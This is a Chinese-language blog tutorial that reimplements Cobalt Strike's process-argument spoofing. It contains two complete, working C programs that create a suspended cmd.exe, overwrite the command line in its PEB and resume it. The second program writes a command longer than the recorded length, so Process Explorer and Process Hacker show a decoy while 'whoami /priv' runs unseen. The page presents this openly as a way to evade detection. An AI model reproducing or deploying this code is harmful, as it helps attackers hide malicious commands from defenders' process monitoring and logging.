# CobaltStrike Argue命令实现

## 简介

在Cobalt Strike 3.13版本的时候引入了一个进程参数欺骗的技术\(虽然现在都4.0了\)，可以使进程在创建时记录的参数与实际运行时不同，windows系统从peb的commandline中读取参数，并对参数做相应的处理，在线程未初始化完成前，我们可以修改参数，并让进程执行它，在操作上几乎与命令行伪装一样，只是有一些流程上的不同，这里不过多赘述详见[伪装命令行规避检测](fake-commandline.md)。

## 利用流程

1. 创建一个挂起的cmd或powershell进程。
2. 读取peb内的RTL\_USER\_PROCESS\_PARAMETERS结构体。
3. 定位到commandline的buffer指针。
4. 修改buffer的存放的commandline。

## 代码实现

```text
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>


typedef DWORD(*pNtQueryInformationProcess) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main()
{

	ULONG lenght = 0;
	HMODULE hModule;
	PROCESS_BASIC_INFORMATION ProcessInformation;
	pNtQueryInformationProcess NtQueryInformationProcess;
	wchar_t CommandLine[] = L"C:\\Windows\\system32\\cmd.exe /c dir";
	//.&& whoami / priv && pause"
	wchar_t CurrentDirectory[] = L"C:\\Windows\\system32\\";

	hModule = LoadLibraryA("ntdll.dll");

	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA(NULL, (LPSTR)"C:\\Windows\\system32\\cmd.exe /c whoami", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);
	
	RTL_USER_PROCESS_PARAMETERS rupp = { 0 };
	PEB peb = { 0 };

	ReadProcessMemory(pi.hProcess, ProcessInformation.PebBaseAddress, &peb, sizeof(peb), NULL);
	ReadProcessMemory(
		pi.hProcess,
		peb.ProcessParameters,
		&rupp,
		sizeof(RTL_USER_PROCESS_PARAMETERS)
		, NULL);

	WriteProcessMemory(pi.hProcess, (LPVOID)rupp.CommandLine.Buffer, CommandLine, sizeof(CommandLine), NULL);
	ResumeThread(pi.hThread);

	return 0;
}
```

执行了修改后的参数: 

![](../.gitbook/assets/image%20%28112%29.png)

## 扩展利用

前面我们说了process hacker和process explorer等进程监视工具会从peb内直接读取commandline的内容，这时就有小朋友要问了，那我们这么做不是会被发现吗\(不皮了不皮了\)。

实际上这么做确实会被此类工具发现明显异常，但由于操作系统读取数据和此类工具读取数据存在一定差异，我们可以利用这样的读取差异来隐藏我们真实的参数。

由于进程监视工具\(啃过源码\)会先读取commandline的length，根据length的值来读取commandline.buffer的内容，而操作系统则由是通过'\x00'来判断字符串是否结束。

这时我们可以写入一个比length更长的命令让监视工具的读取不完全，那么我们就可以在此类工具中伪装commandline。

### 代码

```text
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>


typedef DWORD(*pNtQueryInformationProcess) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main()
{

	ULONG lenght = 0;
	HMODULE hModule;
	PROCESS_BASIC_INFORMATION ProcessInformation;
	pNtQueryInformationProcess NtQueryInformationProcess;
	wchar_t CommandLine[] = L"C:\\Windows\\system32\\cmd.exe /c dir . && whoami /priv && pause";

	wchar_t CurrentDirectory[] = L"C:\\Windows\\system32\\";

	hModule = LoadLibraryA("ntdll.dll");

	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA(NULL, (LPSTR)"C:\\Windows\\system32\\cmd.exe /c whoami", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);
	
	RTL_USER_PROCESS_PARAMETERS rupp = { 0 };
	PEB peb = { 0 };

	ReadProcessMemory(pi.hProcess, ProcessInformation.PebBaseAddress, &peb, sizeof(peb), NULL);
	ReadProcessMemory(
		pi.hProcess,
		peb.ProcessParameters,
		&rupp,
		sizeof(RTL_USER_PROCESS_PARAMETERS)
		, NULL);

	WriteProcessMemory(pi.hProcess, (LPVOID)rupp.CommandLine.Buffer, CommandLine, sizeof(CommandLine), NULL);
	ResumeThread(pi.hThread);

	return 0;
}
```

### 实现效果

![process explorer](../.gitbook/assets/image%20%28111%29.png)

![process hacker](../.gitbook/assets/image%20%28109%29.png)

![dir . &amp;&amp; whoami /priv &amp;&amp; pause](../.gitbook/assets/image%20%28110%29.png)

## LINKS

{% embed url="https://app.gitbook.com/@idiotc4t/s/idiotc4t-s-blog/~/drafts/-M9J1qlIVoEe-n1mUrUo/defense-evasion/fake-commandline" %}

{% embed url="https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/" %}





